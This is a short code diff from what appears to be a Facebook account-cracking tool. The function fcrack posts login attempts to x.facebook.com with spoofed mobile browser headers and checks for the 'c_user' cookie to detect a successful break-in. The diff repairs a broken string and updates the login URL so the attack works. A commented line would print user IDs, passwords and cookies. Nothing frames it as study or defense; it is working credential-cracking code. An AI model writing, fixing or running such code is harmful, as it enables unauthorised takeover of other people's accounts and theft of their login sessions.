@@ -548,7 +548,7 @@ def fcrack(uid,pwx,tl):
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
     'viewport-width': '980',
 }
-			lo = session.post(''https://x.facebook.com/login/?ref=dbl&fl&login_from_aymh=1&hrc',data=log_data,headers=header_freefb).text
+			lo = session.post('https://x.facebook.com/login/?ref=dbl&fl&login_from_aymh=1&hrc=1&wtsid=rdr_0zTkXJQweNzLuP1oT',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
 			if 'c_user' in log_cookies:
